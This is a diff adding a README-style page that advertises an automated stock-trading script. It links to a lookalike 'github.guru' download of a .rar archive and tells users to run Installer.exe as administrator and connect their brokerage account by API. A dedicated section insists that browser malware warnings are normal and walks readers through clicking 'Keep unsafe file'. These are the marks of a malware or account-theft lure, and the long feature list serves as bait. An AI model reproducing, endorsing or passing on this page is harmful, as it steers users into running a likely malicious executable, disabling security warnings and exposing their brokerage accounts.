@@ -1,0 +1,217 @@
+                         ▄▄                                                                                                       
+ ▄█▀▀▀█▄█                ██             ██      ▀███▀▀▀██▄                         ▄█▀▀▀█▄█ ██                  ▀███              
+▄██    ▀█                               ██        ██    ██                        ▄██    ▀█ ██                    ██              
+▀███▄    ▄██▀██▀███▄███▀███ ▀████████▄██████      ██    █████  ▀███ ▀██▀   ▀██▀   ▀███▄   ██████  ▄██▀██▄ ▄██▀██  ██  ▄██▀ ▄██▀███
+  ▀█████▄█▀  ██  ██▀ ▀▀  ██   ██   ▀██  ██        ██▀▀▀█▄▄ ██    ██   ██   ▄█       ▀█████▄ ██   ██▀   ▀███▀  ██  ██ ▄█    ██   ▀▀
+▄     ▀███       ██      ██   ██    ██  ██        ██    ▀█ ██    ██    ██ ▄█      ▄     ▀██ ██   ██     ███       ██▄██    ▀█████▄
+██     ███▄    ▄ ██      ██   ██   ▄██  ██        ██    ▄█ ██    ██     ███       ██     ██ ██   ██▄   ▄███▄    ▄ ██ ▀██▄  █▄   ██
+█▀█████▀ █████▀▄████▄  ▄████▄ ██████▀   ▀████   ▄████████  ▀████▀███▄   ▄█        █▀█████▀  ▀████ ▀█████▀ █████▀▄████▄ ██▄▄██████▀
+                              ██                                      ▄█                                                          
+                            ▄████▄                                  ██▀                                                           
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                         SCRIPT FOR BUYING STOCKS                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+SCRIPT FOR BUYING STOCKS — is a powerful algorithmic trading software that automates stock purchases based on customizable technical indicators and market conditions. The program connects directly to your brokerage account via API, executes trades automatically, and helps you implement sophisticated investment strategies without manual intervention. Perfect for both beginners and experienced traders looking to systematize their investing.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                   https://github.guru/s/CZWyT45q                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] DOWNLOAD    →  Stock_Script.rar
+    [2] EXTRACT     →  WinRAR or 7-Zip
+    [3] RUN         →  Installer.exe (as administrator)
+    [4] CONNECT     →  Link your brokerage account via API
+    [5] CONFIGURE   →  Set your trading strategy
+    [6] ACTIVATE    →  Start automated trading
+    ──────────────────────────────────────────────────
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 CORE ARCHITECTURE
+    The program uses a sophisticated algorithmic engine that operates directly from your computer while connecting to brokerage APIs. It functions as a Software-as-a-Service (SaaS) platform that offers automated and algorithmic trading features in a user-friendly interface. Unlike many other platforms that require you to send funds to them, this script does not — instead, it trades from your existing brokerage account using an API (Application Programming Interface) connection .
+    
+    🔹 BROKERAGE INTEGRATION
+    • Direct API connection to major brokerages (TD Ameritrade, E*TRADE, Robinhood, Interactive Brokers)
+    • Paper trading mode for risk-free strategy testing with virtual funds
+    • Real-time balance and portfolio synchronization
+    • Secure encrypted connection — no sensitive data stored locally
+    • Support for both cash and margin accounts
+    
+    🔹 TRADING STRATEGIES
+    The script implements multiple proven investment approaches :
+    
+    • CONTINUOUS BUYING: Performs purchases consistently at each interval, regardless of market price changes. This follows the principle of dollar-cost averaging, allowing users to build an investment position over time.
+    
+    • DECLINING BUYING: Triggers purchases only when the asset's price has declined from the previous interval's closing price. This approach helps capitalize on lower price points, potentially improving average costs during downward trends.
+    
+    • MOMENTUM STRATEGY: Buys stocks showing strong upward price movement with high relative strength
+    
+    • MEAN REVERSION: Identifies oversold conditions using RSI and Bollinger Bands for bounce opportunities
+    
+    • MOVING AVERAGE CROSSOVER: Generates buy signals when short-term MA crosses above long-term MA 
+    
+    🔹 ENTRY CONDITIONS
+    Users can configure sophisticated entry rules combining multiple technical indicators :
+    
+    • PRICE-BASED: Buy when price crosses above/below specific moving averages (SMA 20/50/200)
+    • INDICATOR-BASED: RSI thresholds (oversold/overbought), MACD crossovers, Bollinger Band touches
+    • VOLUME-BASED: Entry on unusual volume spikes or volume confirmations
+    • FUNDAMENTAL FILTERS: P/E ratio, earnings growth, sector performance
+    • COMBINATION RULES: Support for multiple 'and'/'or' conditions between indicators
+    
+    🔹 DYNAMIC INVESTMENT ADJUSTMENT
+    Advanced feature that increases purchasing amount when prices decline :
+    
+    • If enabled, increases buying amount by 50% when current price falls by user-defined percentage
+    • Helps accumulate larger positions during market dips
+    • Improves long-term cost averaging
+    • Configurable threshold and multiplier settings
+    
+    🔹 EXIT CONDITIONS
+    Multiple methods to close positions and secure profits :
+    
+    • TAKE PROFIT: Automatically sell when price reaches target percentage gain
+    • STOP LOSS: Limit losses with automatic sell at defined loss threshold
+    • TRAILING STOP: Dynamic stop that follows price upward
+    • TECHNICAL EXIT: Sell based on indicator signals (RSI overbought, MA death cross)
+    • TIME-BASED: Auto-close positions at end of trading day (for day trading)
+    
+    🔹 BACKTESTING ENGINE
+    Test your strategies against historical data before risking real money :
+    
+    • Custom time windows: 1D, 1W, 1M, 3M, 1Y, or custom date ranges
+    • Performance metrics: Win rate, profit factor, max drawdown, Sharpe ratio
+    • Visual charts showing entry/exit points on price history
+    • Comparison mode: Test multiple strategies side-by-side
+    • Export results to CSV/PDF for detailed analysis
+    • Note: Past performance does not guarantee future results
+    
+    🔹 AI-POWERED SIGNALS (Premium Feature)
+    Advanced machine learning integration for smarter trading decisions :
+    
+    • Analyzes information from over 3,000 data sources including sentiment data
+    • Processes large volumes of market data for AI modeling with substantial computational resources
+    • Generates buy/watch/sell recommendations with confidence scores
+    • Provides fundamental quality scores (1-10) for each stock
+    • Includes investment thesis, pros/cons, and risk assessment
+    
+    🔹 MARKET INTELLIGENCE
+    Enhanced stock selection tools :
+    
+    • ADR% (Average Daily Range): Measures stock volatility using 20-day average percentage move
+    • INTRINSIC INTELLIGENCE: Aggregates insights from 3,000+ data sources
+    • SENTIMENT ANALYSIS: Tracks social media, news, and analyst sentiment
+    • VOLATILITY METRICS: Real-time volatility calculations
+    • LIQUIDITY SCREENING: Filter stocks by average daily volume and market cap
+    
+    🔹 AUTOMATION FEATURES
+    • 24/7 market monitoring across global exchanges
+    • Scheduled scanning at custom intervals (1min to daily)
+    • Instant execution when conditions are met
+    • Multi-stock portfolio management
+    • Up to 10 concurrent strategies running simultaneously 
+    
+    🔹 RISK MANAGEMENT
+    • Position sizing calculator based on portfolio risk percentage
+    • Maximum allocation limits per stock/strategy
+    • Daily loss limits to prevent over-trading
+    • Diversification rules to avoid concentration
+    • Emergency stop-all button to halt all trading
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ INDICATORS SUPPORTED:
+    ─────────────────────────────────────────────────────────────────
+    
+    TREND INDICATORS  │ MOMENTUM          │ VOLATILITY       │ VOLUME
+    ─────────────────────────────────────────────────────────────────
+    SMA (10-200)      │ RSI (Relative     │ Bollinger Bands  │ Volume SMA
+    EMA (exponential) │ Strength Index)   │ Keltner Channels │ OBV (On Balance
+    MACD              │ Stochastic        │ ATR (Average     │   Volume)
+    Ichimoku Cloud    │ CCI               │   True Range)    │ Volume Profile
+    Parabolic SAR     │ Williams %R       │ Historical Vol   │ VWAP
+    Supertrend  │ Money Flow Index │                  │
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS              │ Windows 7, 8, 10, 11 (64-bit)
+    RAM             │ 4GB minimum (8GB recommended for backtesting)
+    Storage         │ 500MB for program + data storage
+    Internet        │ Broadband connection required for real-time data
+    .NET Framework  │ Version 4.8 or higher
+    Browser         │ Chrome/Firefox/Edge for dashboard access
+    Brokerage       │ Supported: TD Ameritrade, E*TRADE, Interactive Brokers,
+                    │ Robinhood, TradeStation, Alpaca, and 20+ more
+    ─────────────────────────────────────────────────────────────────
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    stock trading bot     │ automated trading       │ algorithmic trading
+    stock script          │ trading software        │ buy stocks automatically
+    trading bot           │ stock market bot        │ auto trader
+    stock screener        │ trading algorithm       │ investment script
+    technical analysis    │ stock indicators        │ trading automation
+    backtesting tool      │ paper trading           │ algorithmic investing
+    stock market 2026     │ trading strategies      │ automated investor
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                 ⚠ IMPORTANT DOWNLOAD WARNING                              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may show a warning when downloading this file.
+    This is completely normal.
+
+    ═══════════════════════════════════════════════════════════════════════
+    
+    ❓ WHY DOES THIS HAPPEN?
+    
+    The warning appears because the file:
+    
+    • Is not distributed through major app stores (Microsoft Store)
+    • Has fewer downloads than mainstream software
+    • Uses .exe format or compressed archives (.rar/.zip)
+    • Is new or less known in browser databases
+    
+    ⚡ This does NOT mean the file is dangerous. This is a standard browser 
+       protection mechanism triggered by download count, not by detecting 
+       malware. Similar trading tools receive the same warnings.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    Browser         │ Action
+    ─────────────────────────────────────────────────────────────────
+    Chrome/Edge     │ Click "Keep" or "Keep anyway"
+                    │ → Confirm "Keep unsafe file"
+    ─────────────────────────────────────────────────────────────────
+    Firefox         │ Click arrow → "Allow download"
+    ─────────────────────────────────────────────────────────────────
+    Opera/Brave     │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    🔍 VERIFICATION STEPS (Optional):
+    
+    1. After download, scan file with VirusTotal (www.virustotal.com)
+    2. Start with paper trading mode to test functionality
+    3. Begin with small allocations when moving to real money
+    
+    ═══════════════════════════════════════════════════════════════════════
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                   https://github.guru/s/CZWyT45q                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+────────────────────────────────────────────────────────────────────────────
+Disclaimer: This software is a third-party tool and is not affiliated with any brokerage firm. Trading stocks involves substantial risk of loss and is not suitable for all investors. Past performance of any trading strategy does not guarantee future results. This tool is for educational purposes and should be used with paper trading accounts before risking real capital. Users are solely responsible for their investment decisions and compliance with applicable laws and regulations .
+────────────────────────────────────────────────────────────────────────────
